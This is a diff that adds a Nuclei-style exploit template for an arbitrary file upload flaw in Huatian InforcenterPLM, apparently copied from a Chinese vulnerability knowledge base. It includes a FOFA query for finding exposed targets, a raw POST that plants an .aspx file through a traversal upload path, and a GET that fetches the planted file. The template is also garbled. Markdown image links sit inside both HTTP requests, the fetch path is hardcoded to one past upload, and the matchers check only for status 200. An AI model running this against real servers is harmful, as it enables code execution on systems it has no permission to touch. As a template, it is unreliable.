@@ -1,0 +1,60 @@
+id: poc-ogh32ehgu27pypz3
+info:
+  name: 华天InforcenterPLM BaseHandler存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ogh32ehgu27pypz3'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ogh32ehgu27pypz3
+    fofa: body="/Base/BaseHandler.ashx"
+http:
+- raw:
+  - 'POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFGykZvnKO6OXcbjq
+
+    Accept: */*
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFGykZvnKO6OXcbjq
+
+    Content-Disposition: form-data; name="file"; filename="hello.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%= "Hello World1!" %>
+
+    ------WebKitFormBoundaryFGykZvnKO6OXcbjq--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498997744-a6ba617b-e041-4d57-9522-318892a449d3.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /Files/20250723/4c414103-1831-4c45-8a64-e075487ec71d.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498997937-7dedbec2-457e-496b-8c07-d4f01a09f7ff.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
